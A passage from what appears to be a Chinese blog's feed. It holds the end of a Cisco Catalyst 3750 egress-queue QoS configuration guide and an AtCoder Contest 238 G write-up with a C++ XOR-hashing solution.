0-99</p></blockquote><p>要为每个队列配置两个阈值（后备阈值和最大阈值）（默认情况下，阈值 3 为100%，且不可更改），请使用以下命令：</p><blockquote><p>Rack1SW1(config)#<strong>mls qos queue-set output 1 threshold?</strong> &lt;1-4&gt; enter <strong>queue id</strong> in this queueset</p><p>Rack1SW1(config)#<strong>mls qos queue-set output 1 threshold 1?</strong> &lt;1-400&gt; enter drop <strong>threshold1</strong>1-400</p><p>Rack1SW1(config)#<strong>mls qos queue-set output 1 threshold 1 50?</strong> &lt;1-400&gt; enter drop <strong>threshold2</strong>1-400</p><p>Rack1SW1(config)#<strong>mls qos queue-set output 1 threshold 1 50 60?</strong> &lt;1-100&gt; enter <strong>reserved threshold</strong>1-100</p><p>Rack1SW1(config)#<strong>mls qos queue-set output 1 threshold 1 50 60100 ?</strong> &lt;1-400&gt; enter <strong>maximum threshold</strong>1-400</p></blockquote><p>要将队列集应用于接口（当在交换机上启用 qos 后，默认情况下，queue set1 将分配给所有端口），请使用以下命令：</p><blockquote><p>Rack1SW1(config-if)#<strong>queue-set ?</strong> &lt;1-2&gt; the qsetto which this port is mapped</p></blockquote></li><li><p><strong>调度程序配置：</strong></p><p>可以为交换机接口使用三种不同的配置。这些配置为带宽整形、共享和限制。也可以将egress queue 1配置为优先队列。如果启用优先队列，则在为其他三个队列提供服务之前，SRR将始终为优先队列提供服务，直至该队列为空。但在入口优先队列中，SRR使用所配置的值为优先队列提供服务。</p><blockquote><p>Rack1SW1(config-if)#<strong>srr-queue bandwidth ?</strong> limitConfigure bandwidth-limit for this interface shape Configure shaping ontransmit queues share Configure shared bandwidth</p><p>Rack1SW1(config-if)#<strong>priority-queue ?</strong> out egresspriority queue</p></blockquote><p><strong>带宽限制配置：</strong></p><blockquote><p>Rack1SW1(config-if)#<strong>srr-queue bandwidth limit ?</strong>&lt;10-90&gt; enter bandwidth limit for interface as percentage</p></blockquote><p><strong>带宽整形配置：</strong></p><blockquote><p>Rack1SW1(config-if)#<strong>srr-queue bandwidth shape ?</strong>&lt;0-65535&gt; enter bandwidth weight for queue id 1</p><p>Rack1SW1(config-if)#<strong>srr-queue bandwidth shape 10 ?</strong>&lt;0-65535&gt; enter bandwidth weight for queue id 2</p><p>Rack1SW1(config-if)#<strong>srr-queue bandwidth shape 10 20?</strong> &lt;0-65535&gt; enter bandwidth weight for queue id 3</p><p>Rack1SW1(config-if)#<strong>srr-queue bandwidth shape 10 20 30?</strong> &lt;0-65535&gt; enter bandwidth weight for queue id 4</p></blockquote><p><strong>带宽共享配置：</strong></p><blockquote><p>Rack1SW1(config-if)#<strong>srr-queue bandwidth share ?</strong>&lt;1-255&gt; enter bandwidth weight for queue id 1</p><p>Rack1SW1(config-if)#<strong>srr-queue bandwidth share 10 ?</strong>&lt;1-255&gt; enter bandwidth weight for queue id 2</p><p>Rack1SW1(config-if)#<strong>srr-queue bandwidth share 10 20?</strong> &lt;1-255&gt; enter bandwidth weight for queue id 3</p><p>Rack1SW1(config-if)#<strong>srr-queue bandwidth share 10 20 30?</strong> &lt;1-255&gt; enter bandwidth weight for queue id 4</p></blockquote><p>除非启用优先队列，否则全部四个队列都将加入SRR，在这种情况下，将忽略第一个带宽权重，并且在比率计算也不使用第一个带宽权重。在为其他队列服务前，将始终为优先队列提供服务，直至该队列为空。通过使用<strong>priority-queue out接口配置命令，可以启用优先队列。</strong></p></li></ul><h3 id="默认配置">默认配置</h3><p><strong>默认队列映射配置：</strong></p><p><a href="https://www.cisco.com/c/dam/en/us/support/docs/switches/catalyst-3750-series-switches/91862-cat3750-qos-config10.gif" title="cat3750-qos-config10.gif"><img src="https://googles.plus/images/loading.gif" data-original="https://www.cisco.com/c/dam/en/us/support/docs/switches/catalyst-3750-series-switches/91862-cat3750-qos-config10.gif" alt="cat3750-qos-config10.gif"></a></p><p>以下默认映射可根据需要进行更改：</p><blockquote><p><em>!--- Map CoS to Egress Queue</em> Distribution1#<strong>show mlsqos maps</strong> <strong>cos-output-q</strong> Cos-outputq-thresholdmap: cos: 0 1 2 3 4 5 6 7 ------------------------------------queue-threshold: 2-1 2-1 3-1 3-1 4-1 1-1 4-1 4-1</p><p><em>!--- Map DSCP to Egress Queue</em> Distribution1#<strong>show mlsqos maps</strong> <strong>dscp-output-q</strong> Dscp-outputq-thresholdmap: d1 :d2 0 1 2 3 4 5 6 7 8 9------------------------------------------------------------ 0 : 02-0102-01 02-01 02-01 02-01 02-01 02-01 02-01 02-01 02-01 1 : 02-01 02-0102-01 02-01 02-01 02-01 03-01 03-01 03-01 03-01 2 : 03-01 03-01 03-0103-01 03-01 03-01 03-01 03-01 03-01 03-01 3 : 03-01 03-01 04-01 04-0104-01 04-01 04-01 04-01 04-01 04-01 4 : 01-01 01-01 01-01 01-01 01-0101-01 01-01 01-01 04-01 04-01 5 : 04-01 04-01 04-01 04-01 04-01 04-0104-01 04-01 04-01 04-01 6 : 04-01 04-01 04-01 04-01</p></blockquote><p><strong>默认队列配置：</strong></p><p><a href="https://www.cisco.com/c/dam/en/us/support/docs/switches/catalyst-3750-series-switches/91862-cat3750-qos-config11.gif" title="cat3750-qos-config11.gif"><img src="https://googles.plus/images/loading.gif" data-original="https://www.cisco.com/c/dam/en/us/support/docs/switches/catalyst-3750-series-switches/91862-cat3750-qos-config11.gif" alt="cat3750-qos-config11.gif"></a></p><p>出口队列默认设置适用于大多数场合。只有在对出口队列透彻了解之后以及这些设置不能满足您的QoS 解决方案时，才需要更改这些设置。</p><p>默认情况下，将配置两个队列集，并将 queue set 1分配给所有端口。为每个队列分配总缓冲区空间的25%。每个队列保留所分配的缓冲区空间的 50%，即总缓冲区空间的12.5%。所有后备缓冲区的总和表示后备池，剩余的缓冲区是公用池的一部分。默认配置将此队列可拥有的最大内存量设置为400%，超过此最大内存量后，将丢弃数据包。</p><blockquote><p>Distribution1#<strong>show mls qos</strong> <strong>queue-set1</strong> Queueset: 1 Queue : 1 2 3 4---------------------------------------------- buffers : 25 25 25 25threshold1: 100 200 100 100 threshold2: 100 200 100 100 reserved : 50 5050 50 maximum : 400 400 400 400</p><p>Distribution1#<strong>show mls qos</strong> <strong>queue-set2</strong> Queueset: 2 Queue : 1 2 3 4---------------------------------------------- buffers : 25 25 25 25threshold1: 100 200 100 100 threshold2: 100 200 100 100 reserved : 50 5050 50 maximum : 400 400 400 400</p><p>Distribution1#<strong>show mls qos int</strong><strong>gigabitEthernet 1/0/20</strong> buffers GigabitEthernet1/0/20<strong>The port is mapped to qset : 1</strong> The allocations betweenthe queues are : 25 25 25 25</p></blockquote><p><strong>默认调度程序配置：</strong></p><p>优先队列处于禁用状态。同时为 SRR配置整形和共享模式。整形模式权重将覆盖共享模式值。因此，最终结果是，以整形模式为queue 1 提供服务，以共享模式为 queue 2、3 和 4提供服务。这意味着将使用一个绝对带宽百分比值（1/25 或百分之四）为 queue1 提供服务。使用 25% 的带宽为 Queue 2、3 和 4 提供服务。如果带宽可用，为queue 2、3 和 4 提供服务的带宽可以超过总带宽的 25%。</p><blockquote><p>Distribution1#<strong>show mls qos int gigabitEthernet 1/0/20queueing</strong> GigabitEthernet1/0/20 Egress <strong>PriorityQueue</strong> : disabled <strong>Shaped</strong> queue weights(absolute) : 25 0 0 0 <strong>Shared</strong> queue weights : 25 25 2525 The port bandwidth <strong>limit</strong> : 100 (OperationalBandwidth:100.0) The port is mapped to qset : 1</p></blockquote><h3 id="排队丢弃和调度-1">排队、丢弃和调度</h3><p>以下为示例配置：</p><ul><li><p><strong>队列映射配置：</strong></p><blockquote><p>Rack1SW1(config)#<strong>mls qos srr-queue output cos-map queue 1threshold 3 5</strong> Rack1SW1(config)#<strong>mls qos srr-queue outputcos-map queue 1 threshold 1 2 4</strong> Rack1SW1(config)#<strong>mlsqos srr-queue output cos-map queue 2 threshold 2 3</strong>Rack1SW1(config)#<strong>mls qos srr-queue output cos-map queue 2threshold 3 6 7</strong> Rack1SW1(config)#<strong>mls qos srr-queueoutput cos-map queue 3 threshold 3 0</strong>Rack1SW1(config)#<strong>mls qos srr-queue output cos-map queue 4threshold 3 1</strong></p></blockquote><blockquote><p>Rack1SW1(config)#<strong>mls qos srr-queue output dscp-map queue 1threshold 3 46</strong> Rack1SW1(config)#<strong>mls qos srr-queueoutput dscp-map queue 2 threshold 1 16</strong>Rack1SW1(config)#<strong>mls qos srr-queue output dscp-map queue 2threshold 1 18 20 22</strong> Rack1SW1(config)#<strong>mls qos srr-queueoutput dscp-map queue 2 threshold 1 25</strong>Rack1SW1(config)#<strong>mls qos srr-queue output dscp-map queue 2threshold 1 32</strong> Rack1SW1(config)#<strong>mls qos srr-queueoutput dscp-map queue 2 threshold 1 34 36 38</strong>Rack1SW1(config)#<strong>mls qos srr-queue output dscp-map queue 2threshold 2 24 26</strong> Rack1SW1(config)#<strong>mls qos srr-queueoutput dscp-map queue 2 threshold 3 48 56</strong>Rack1SW1(config)#<strong>mls qos srr-queue output dscp-map queue 3threshold 3 0</strong> Rack1SW1(config)#<strong>mls qos srr-queue outputdscp-map queue 4 threshold 1 8</strong> Rack1SW1(config)#<strong>mls qossrr-queue output dscp-map queue 4 threshold 3 10 12 14</strong></p></blockquote></li><li><p><strong>队列配置：</strong></p><p>以下配置显示了 queue set 1 和 2 的配置。默认情况下，queue set 1应用于所有接口。</p><blockquote><p>Rack1SW3(config)#<strong>mls qos queue-set output 1 buffers 10 10 2654</strong> Rack1SW3(config)#<strong>mls qos queue-set output 2 buffers16 6 17 61</strong></p></blockquote><blockquote><p>Rack1SW3(config)#<strong>mls qos queue-set output 1 threshold 2 70 80100 100</strong> Rack1SW3(config)#<strong>mls qos queue-set output 1threshold 4 40 100 100 100</strong></p><p>Rack1SW3(config)#<strong>mls qos queue-set output 2 threshold 1 149149 100 149</strong> Rack1SW3(config)#<strong>mls qos queue-set output 2threshold 2 118 118 100 235</strong> Rack1SW3(config)#<strong>mls qosqueue-set output 2 threshold 3 41 68 100 272</strong>Rack1SW3(config)#<strong>mls qos queue-set output 2 threshold 4 42 72100 242</strong></p></blockquote><blockquote><p>Rack1SW3(config)#<strong>int fa 1/0/11</strong>Rack1SW3(config-if)#<strong>queue-set 2</strong></p></blockquote><p>queue set 2 应用于接口 1/0/11。</p><blockquote><p>Rack1SW3(config-if)#<strong>do show mls qos int fa 1/0/10buffers</strong> FastEthernet1/0/10 The port is mapped to qset : 1 Theallocations between the queues are : 10 10 26 54</p><p>Rack1SW3(config-if)#<strong>do show mls qos int fa 1/0/11buffers</strong> FastEthernet1/0/11 The port is mapped to qset : 2 Theallocations between the queues are : 16 6 17 61</p></blockquote></li><li><p><strong>调度程序配置：</strong></p><blockquote><p>Rack1SW3(config-if)#<strong>srr-queue bandwidth share 1 75 255</strong> Rack1SW3(config-if)#<strong>srr-queue bandwidth shape 3 0 00</strong></p></blockquote><p>Cisco Catalyst 3750出口队列不支持低延迟队列(LLQ)。它支持优先队列。配置 priority-queue out 后，如果 queue 1具有数据包，则始终为该队列提供服务。</p><blockquote><p>Rack1SW3(config-if)#<strong>srr-queue bandwidth share 1 75 255</strong> Rack1SW3(config-if)#<strong>srr-queue bandwidth shape 3 0 00</strong> Rack1SW3(config-if)#<strong>priority-queue out</strong></p></blockquote><p>配置此命令时，因为有一个较小的队列加入 SRR，所以 SRR权重和队列大小比率会受到影响。这意味着将忽略 <strong>srr-queue bandwidthshape 或 srr-queue bandwidth share 命令中的weight1（不用于比率计算）。</strong></p></li></ul><p>以下为查看特定队列上的丢包的命令：</p><p>步骤 1：</p><blockquote><p>1/ #<strong>show platform pm if-numbers</strong></p></blockquote><p>使用<strong>show platform pmif-numbers</strong>命令并检查与接口对应的端口信息（这是3750上的传出接口）。例如，fas0/3将是端口0/4。将4保留为端口值；如果第一个值不是零，则在端口号后输入asic编号。</p><blockquote><p>interface gid gpn lpn port slot unit slun port-type lpn-idb gpn-idb--------------------------------------------------------------------------------- Gi0/1 1 1 25 0/1 1 1 1 local Yes Yes Gi0/2 2 2 26 0/0 1 2 2local Yes Yes Fa0/1 3 3 1 0/2 1 1 3 local Yes Yes Fa0/2 4 4 2 0/3 1 2 4local Yes Yes <strong>Fa0/3</strong> 5 5 3 <strong>0/4</strong> 1 3 5local Yes Yes Fa0/4 6 6 4 0/5 1 4 6 local Yes Yes Fa0/5 7 7 5 0/6 1 5 7local Yes Yes Fa0/6 8 8 6 0/7 1 6 8 local Yes Yes</p></blockquote><p>与接口fa 0/3对应的端口值为0/4。现在，您可以使用<strong>show platformport-asic stats drop port 4命令看到接口fa 0/3的队列丢弃</strong>。</p><blockquote><p>2/ #<strong>show platform port-asic stats drop port 4</strong></p><h1 id="port-asic-port-drop-statistics---summary">Port-asic Port DropStatistics - Summary</h1><p>RxQueue 0 Drop Stats: 0 RxQueue 1 Drop Stats: 0 RxQueue 2 Drop Stats:0 RxQueue 3 Drop Stats: 0 ...</p><p>Port 4 TxQueue Drop Statistics Queue 0 Weight 0 Frames 0 Weight 1Frames 0 Weight 2 Frames 0 Queue 1 Weight 0 Frames 0 Weight 1 Frames2755160 &lt;--- Here is an example of drops Weight 2 Frames 0 Queue 2Weight 0 Frames 0 Weight 1 Frames 0 Weight 2 Frames 0 Queue 3 Weight 0Frames 0 Weight 1 Frames 0 Weight 2 Frames 8</p></blockquote><p>步骤 2：</p><ul><li><p><strong>带宽限制配置：</strong></p><p>要限制端口的最大输出速率，请配置 srr-queue bandwidth limit接口配置命令。如果将此命令配置为 80%，则端口的空闲时间为20%。线路速率将下降到连接速度的80%。由于硬件将以六为增量调整线路速率，因此这些值并非精确值。此命令在万兆以太网接口上不可用。</p></li></ul><p><code>srr-queue bandwidth limit weight1</code></p><p>其中，_weight1 为应将端口限制到的端口速度百分比。_范围是 10 到90。</p><p><strong>注意：</strong>出口队列默认设置适用于大多数情况。只有在对出口队列有全面了解且这些设置不符合服务质量(QoS)解决方案时，才应更改这些设置。</p><h2 id="相关信息">相关信息</h2><ul><li><strong><a href="https://www.cisco.com/c/zh_cn/support/docs/switches/catalyst-3750-series-switches/91862-cat3750-qos-config.html">CiscoCatalyst 3750 QoS 配置示例</a></strong></li><li><strong><a href="https://www.cisco.com/en/US/docs/switches/lan/catalyst3750/software/release/12.2_35_se/configuration/guide/swqos.html?referring_site=bodynav">配置QoS</a></strong></li><li><strong><a href="https://www.cisco.com/en/US/products/hw/switches/ps5023/tsd_products_support_series_home.html?referring_site=bodynav" title="US 网站">Cisco Catalyst 3750 系列交换机 -支持文档</a></strong></li><li><strong><a href="https://www.cisco.com/web/psa/products/tsd_products_support_general_information.html?c=268438038&amp;sc=278875285&amp;referring_site=bodynav">LAN产品支持</a></strong></li><li><strong><a href="https://www.cisco.com/web/psa/technologies/tsd_technology_support_technology_information.html?c=268435696&amp;referring_site=bodynav">LAN交换技术支持</a></strong></li><li><strong><a href="https://www.cisco.com/cisco/web/support/index.html?referring_site=bodynav" title="US 网站">技术支持和文档 - Cisco Systems</a></strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cisco </tag>
            
            <tag> QoS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AtCoder Contest 238 - G 题解</title>
      <link href="/2022/02/15/atcoder-contest-238-g-ti-jie/"/>
      <url>/2022/02/15/atcoder-contest-238-g-ti-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="atcoder-contest-238---g-题解">AtCoder Contest 238 - G 题解</h1><h2 id="题目内容">题目内容</h2><p>Given a sequence <span class="math inline">\(A\)</span> of <span class="math inline">\(N\)</span> numbers, answer the following <span class="math inline">\(Q\)</span> questions.</p><ul><li>In the <span class="math inline">\(i\)</span>-th question, you aregiven integers <span class="math inline">\(L_i\)</span> and <span class="math inline">\(R_i\)</span> . Is <span class="math inline">\(A_{L_i} \times A_{L_i+1} \times \dots \timesA_{R_i}\)</span>A a cubic number?</li></ul><p>Here, a positive integer <span class="math inline">\(x\)</span> issaid to be a cubic number when there is a positive integer <span class="math inline">\(y\)</span> such that <span class="math inline">\(x=y^3\)</span> .</p><blockquote><p>给定长为N的序列A，Q 组询问 (l,r)，<br>判断 (<span class="math inline">\(\prod \limits_{i=l}^{r}A_i\)</span>)是否是完全立方数。<br><span class="math inline">\((1 \le N,~Q \le 2 \times 10^5,~1 \le A_i \le10^6)\)</span>.</p></blockquote><h2 id="hash做法">Hash做法</h2><h3 id="code">Code</h3><ul><li>每个质因子生成三个不同的Hash， 满足 <span class="math inline">\({X_2} = {X_0} \oplus {X_1}\)</span> .</li><li>逐个质因子更新异或和序列 <span class="math inline">\(H_j\)</span> ,<span class="math inline">\({H_j} \leftarrow {H_j} \oplus {X_{i\bmod3}}\)</span> , 使每个质因子三个不同的Hash轮流出现。</li><li>异或具有交换律和归零律，可得到： <span class="math inline">\([l,r]\)</span> 区间内每个质因子的个数都是 <span class="math inline">\(3\)</span> 的倍数 ⇒ <span class="math inline">\(H_l \oplus H_{l+1} \oplus \dots \oplus H_r =0\)</span> .（注意，反向不成立）</li><li>使用异或前缀和 <span class="math inline">\(H'\)</span>加快查询速度。</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;bits/stdc++.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MAX</span> <span class="token expression"><span class="token number">1000005</span></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span> q<span class="token punctuation">;</span>    cin <span class="token operator">&gt;&gt;</span> n <span class="token operator">&gt;&gt;</span> q<span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> <span class="token function">a</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> <span class="token operator">&amp;</span>nx<span class="token operator">:</span> a<span class="token punctuation">)</span>    <span class="token punctuation">{</span> cin <span class="token operator">&gt;&gt;</span> nx<span class="token punctuation">;</span> <span class="token punctuation">}</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> <span class="token function">l</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">r</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> q<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span> cin <span class="token operator">&gt;&gt;</span> l<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&gt;&gt;</span> r<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>    uint_fast64_t seed <span class="token operator">=</span> <span class="token number">202202052100238523</span><span class="token punctuation">;</span>    mt19937_64 <span class="token function">engine</span><span class="token punctuation">(</span>seed<span class="token punctuation">)</span><span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;&gt;</span> <span class="token function">pf</span><span class="token punctuation">(</span>MAX<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> MAX<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pf<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span> <span class="token keyword">continue</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span> j <span class="token operator">&lt;</span> MAX<span class="token punctuation">;</span> j <span class="token operator">+=</span> i<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">int</span> mj <span class="token operator">=</span> j<span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>mj <span class="token operator">%</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                pf<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                mj <span class="token operator">/=</span> i<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    vector<span class="token operator">&lt;</span><span class="token keyword">bool</span><span class="token operator">&gt;</span> <span class="token function">res</span><span class="token punctuation">(</span>q<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> tr <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> tr <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> tr<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span>uint_fast64_t<span class="token operator">&gt;&gt;</span> <span class="token function">hs</span><span class="token punctuation">(</span>MAX<span class="token punctuation">,</span> <span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span>uint_fast64_t<span class="token operator">&gt;</span></span></span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> MAX<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>hs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span> hs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">engine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>hs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> hs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> hs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span> hs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">engine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>            hs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>hs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">^</span> hs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> <span class="token function">bk</span><span class="token punctuation">(</span>MAX<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span>uint_fast64_t<span class="token operator">&gt;</span> <span class="token function">rw</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            rw<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> rw<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> <span class="token operator">&amp;</span>nx<span class="token operator">:</span> pf<span class="token punctuation">[</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                rw<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^=</span> hs<span class="token punctuation">[</span>nx<span class="token punctuation">]</span><span class="token punctuation">[</span>bk<span class="token punctuation">[</span>nx<span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                bk<span class="token punctuation">[</span>nx<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> q<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>rw<span class="token punctuation">[</span>l<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> rw<span class="token punctuation">[</span>r<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span> res<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> q<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>res<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span> cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Yes\n"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span> cout <span class="token operator">&lt;&lt;</span> <span class="token string">"No\n"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ACM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> Hash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>优雅地统计二进制数中1的个数</title>
      <link href="/2022/02/14/you-ya-di-tong-ji-er-jin-zhi-shu-zhong-1-de-ge-shu/"/>
      <url>/2022/02/14/you-ya-di-tong-ji-er-jin-zhi-shu-zhong-1-de-ge-shu/</url>
      
